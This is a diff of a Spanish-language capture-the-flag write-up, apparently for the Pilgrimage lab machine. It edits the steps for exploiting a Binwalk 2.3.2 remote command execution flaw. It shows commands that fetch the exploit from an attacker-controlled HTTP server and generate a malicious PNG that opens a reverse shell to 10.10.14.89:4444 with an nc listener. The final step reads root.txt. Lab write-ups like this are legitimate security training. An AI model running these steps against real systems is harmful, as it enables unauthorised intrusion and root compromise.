@@ -1081,45 +1081,7 @@ Este script de Python parece ser un exploit que aprovecha una vulnerabilidad de 
 
 Para realizar la explotacion cree el archivo en mi pc con el script Binwalk v2.3.2 - Remote Command Execution (RCE), en la maquina victima me muevo a la carpeta tmp para decsragar el archivo creado.
 
-**Usando un Servidor HTTP Simple:**
-
-* En la máquina atacante, inicia un servidor HTTP simple:
-
-```bash
-python3 -m http.server 
-```
-
-* En la máquina víctima, utiliza `wget` o `curl` para descargar el archivo:
-
-```bash
-wget http://direccion_ip_atacante:8000/cve.py
-```
-
-<figure><img src="../../../.gitbook/assets/2023-12-06_23-51.png" alt=""><figcaption></figcaption></figure>
-
-Ahora se le otorga permiso de ejecucion.
-
-```
-emily@pilgrimage:/tmp$ chmod +x cve.py
-```
-
-Tambien realice el envio de una imagen para poder realizar la explotacion.
-
-```
-emily@pilgrimage:/tmp$ wget http://10.10.14.89:8000/652d44.png
---2023-12-07 10:56:45--  http://10.10.14.89:8000/652d44.png
-Connecting to 10.10.14.89:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 967 [image/png]
-Saving to: ‘652d44.png’
-
-652d44.png              100%[==============================>]     967  --.-KB/s    in 0.002s
-
-2023-12-07 10:56:47 (550 KB/s) - ‘652d44.png’ saved [967/967]
-
-```
-
-Para realizar la ejecucion se debe hacer los siguentes pasos.
+**Ejecutar cve.py**
 
 ```
 python3 cve.py 652d44.png 10.10.14.89 4444
@@ -1152,3 +1114,22 @@ Crea el png.
 binwalk_exploit.png
 ```
 
+Ahora a eso lo debes envia.
+
+<figure><img src="../../../.gitbook/assets/2023-12-07_00-24.png" alt=""><figcaption></figcaption></figure>
+
+EN la carpeta donde se creo la imagen ,active el servidor con python,de forma paralela estuve en escucha con nc,me posicione en el directorio
+
+```php
+/var/www/pilgrimage.htb/shrunk/
+```
+
+En ese directorio se alacenan las imagen que se suben en el sitio web, en ese directorio hice un curl para descargar la imagen.
+
+```bash
+#En el momento que se descraga la imagen se conecta a la maquina victima.
+#Coloque los siguentes comandos:
+cd 
+ls 
+cat root.txt
+```
